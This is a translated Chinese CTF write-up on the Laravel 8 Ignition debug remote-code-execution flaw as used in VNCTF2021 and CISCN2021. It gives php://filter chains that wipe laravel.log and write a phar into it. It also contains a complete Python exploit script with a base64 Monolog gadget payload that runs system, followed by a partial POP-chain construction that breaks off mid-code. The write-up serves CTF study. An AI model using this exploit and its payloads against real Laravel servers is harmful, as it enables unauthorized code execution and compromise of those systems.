# VNCTF2021 EZ_laravel&&CISCN2021 filter WP
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 写在前面
这两个题目的口子一样，完全可以参照 `laravel 8 debug rce`
的漏洞，里面值得细讲的就是转换器，和不同框架的日志文件，先分析漏洞吧，框架有很多，日志也不相同，希望同样的漏洞发生在不同框架时，可以通过分析日志来变通。
## 环境准备
环境是在 win下面的。
    composer create-project laravel/laravel="8.0.*" laravel8.0 --prefer-dist
    cd laravel8.0
    composer require facade/ignition==2.5.1
    php artisan serve
## 漏洞分析
由于我们是直接创建了一个项目所以，没有出现`Ignition`（Laravel
6+默认错误页面生成器），这个错误页面生成器会提供一个`solutions`。在 这个控制器中有入口。
    src/Http/Controllers/ExecuteSolutionController.php
`solution` 可控 那就可以调用任意 `solution` 的`run`方法。且参数可控。
利用点在`src/Solutions/MakeViewVariableOptionalSolution.php`
`viewFile` 可控，可以或许可以任意写， `$output` 是否可控呢？打个断点，看是否污染吧。构造如下数据
如果我们传入了`variableName`，`$output` 是不会改变的。
那么代码简化
    $output=file_get_contents($parameters['viewFile']);
    file_put_contents($parameters['viewFile'], $output);
写入的文件 和 文件内容是没办法齐美的。写入木马自然不可以。
## 漏洞利用
原作者的思路，是尝试往日志文件中写入 `phar` 文件，然后在 `file_get_contents` 处触发 反序列化。
我们可以利用 `php://filter/write=`过滤器 来获取日志文件的内容，然后在写入过滤后的内容来，写入完整的 phar文件。
###  首先清除日志。
    php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
参考链接已经解释很详细了，就不造次了。
###  写入 payload
    =55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00
可以先观察日志文件，日志只记录了报错信息。
    [2021-05-19 07:54:58] local.ERROR: file_get_contents(=55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00): failed to open stream: No such file or directory {"exception":"[object] (ErrorException(code: 0): file_get_contents(=55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00): failed to open stream: No such file or directory at D:\\ctf\\phpstudy\\phpstudy_pro\\WWW\\sources\\laravel\\laravel8.0\\vendor\\facade\\ignition\\src\\Solutions\\MakeViewVariableOptionalSolution.php:75)
    [stacktrace]
    ……
可以发现 我们的`payload (xxxxx)` 出现了两次。
重点讲一下 写入phar 文件时清空干扰词遇见的的问题。
    php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
`quoted-printable-decode`会把我们的payload解码，
然后在再 `utf-16le->utf-8`
`utf-16le` 是两个字节编码的，
可以看一下，其实 相当于 就是 将 `1234 => 1\02\03\04\0`
我们写入的`payload`也是这种形式的，我们希望在 `utf-16le -> utf-8` 的时候我们的`payload`可以得到正确的解码
那么就需要 payload 前面的字符数量是 偶数个。
喔？奇数个？我们是有两个`payload`在日志文件中的，这两个payload中间也是奇数个的。
而日志文件是奇数个的。
xxxx | payload | xxxx | payload | xxxx  
---|---|---|---|---  
奇数 | 偶数 | 奇数 | 偶数 | 奇数  
这样的话我们可以尝试复写一个前缀进去，
xxxx | AA | xxxx | AA | xxxx  
---|---|---|---|---  
奇数 | 偶数 | 奇数 | 偶数 | 奇数  
xxxx | payload | xxxx | payload | xxxx  
---|---|---|---|---  
奇数 | 偶数 | 奇数 | 偶数 | 奇数  
这样的话，我们处于前面位置的`payload` 就会在转码后 完整保留下来。当我把`payload` 换成phar
的链子的时候，出现了错误，我看有的师傅会在 `payload` 后面再加一个 A，问题是解决了。可能日志的问题吧。但加前缀在一定程度上一定没问题的。
如果在写入phar文件的时候出现了问题，不妨再在`payload`后加一个 A 后缀吧。
贴个自己写的exp吧。
    import requests
    import json
    url = "http://127.0.0.1:8000/_ignition/execute-solution"
    #清空
    file1='php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log'
    #payload
    s='PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpgAQAAAgAAABEAAAABAAAAAAAJAQAATzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6Mzp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6OToiACoAYnVmZmVyIjthOjE6e3M6NDoidGVzdCI7YToyOntpOjA7czo0OiJjYWxjIjtzOjU6ImxldmVsIjtOO319czoxMDoiACoAaGFuZGxlciI7TzoyODoiTW9ub2xvZ1xIYW5kbGVyXEdyb3VwSGFuZGxlciI6MTp7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQUAAABkdW1teQQAAABT2KRgBAAAAAx+f9ikAQAAAAAAAAgAAAB0ZXN0LnR4dAQAAABT2KRgBAAAAAx+f9ikAQAAAAAAAHRlc3R0ZXN07IzUmEt8iAPk56fX9y7EGC+LREcCAAAAR0JNQg=='
    file2=''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()+'A'
    # 清楚干扰字
    file3='php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log'
    file4='phar://../storage/logs/laravel.log'
    def getpayload(file):
      payload = json.dumps({
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": file
        }
      })
      return payload
    headers = {
      'Content-Type': 'application/json'
    }
    def write():
      res=requests.request("POST", url, headers=headers, data=getpayload(file1))
      if 'ErrorException' in res.text:
        requests.request("POST", url, headers=headers, data=getpayload(file1))
      requests.request("POST", url, headers=headers, data=getpayload('AA'))
      requests.request("POST", url, headers=headers, data=getpayload(file2))
      res=requests.request("POST", url, headers=headers, data=getpayload(file3))
      if 'ErrorException' in res.text:
        print('写入失败，重来喽')
    write()
当然这个漏洞还可以利用 `file_put_contents` 通过 `ftp` 被动模式 打`ssrf`。
## 题目
###  [VNCTF 2021]Easy_laravel
给了源码，phar文件写入日志的漏洞还在，但是要重新找一个链子。
找 `__destruct`
`Importconfigurator` 类中
找 `__call()`
`HigherOrderMessage`类中
这里可以实例化任意类，并调用其任意方法。
找存在危险函数的方法。
`Mockclass` 类
这里可以执行任意代码。
    parent = $class;
                $this->route = 'test';
            }
        }
    }
    namespace Mockery{
        class HigherOrderMessage{
            private $mock;